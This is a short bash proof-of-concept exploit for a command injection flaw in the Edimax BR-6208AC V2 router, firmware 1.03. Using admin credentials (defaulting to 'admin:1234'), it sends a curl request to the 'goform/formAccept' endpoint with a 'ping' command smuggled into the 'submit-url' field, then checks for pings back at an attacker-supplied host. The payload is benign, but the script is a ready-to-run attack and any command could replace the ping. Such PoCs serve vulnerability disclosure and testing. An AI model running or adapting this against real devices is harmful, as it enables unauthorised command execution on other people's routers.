#!/bin/bash
# Edimax BR-6208AC V2 (fw 1.03) formAccept submit-url command injection — PoC
# Non-destructive: runs ping back to the attacker host. Requires valid admin credentials.
TARGET="${1:-192.168.2.1}"
USERPASS="${2:-admin:1234}"
LHOST="${3:?attacker IP for ping-back, e.g. 192.168.2.10}"

echo "[*] injecting: ping -c 3 $LHOST  via submit-url"
curl -s -o /dev/null -w "    http=%{http_code}\n" --max-time 8 -u "$USERPASS" \
     --data-urlencode "submit-url=ping -c 3 $LHOST" \
     "http://$TARGET/goform/formAccept"
echo "[*] check $LHOST for 3 ICMP echo requests from $TARGET (e.g. sudo tcpdump -i any icmp)"
